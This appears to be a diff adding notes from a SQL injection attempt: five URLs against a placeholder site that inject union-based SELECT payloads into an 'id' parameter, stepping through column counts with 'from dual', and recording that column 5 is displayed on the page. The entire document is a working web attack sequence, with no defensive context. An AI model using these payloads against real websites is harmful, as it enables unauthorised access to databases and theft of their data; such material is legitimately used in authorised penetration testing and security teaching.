@@ -1,0 +1,5 @@
+http://domain.com/index.php?id=1' Union Select '1', null, null, null, null, null, null from dual-- - not reflecting
+http://domain.com/index.php?id=1' Union Select '1', '2', null, null, null, null, null from dual-- - not reflecting
+http://domain.com/index.php?id=1' Union Select '1', '2', '3', null, null, null, null from dual-- - not reflecting
+http://domain.com/index.php?id=1' Union Select '1', '2', '3', '4', null, null, null from dual-- - not reflecting
+http://domain.com/index.php?id=1' Union Select '1', '2', '3', '4', '5', null, null from dual-- - number 5 is being displayed on the website.
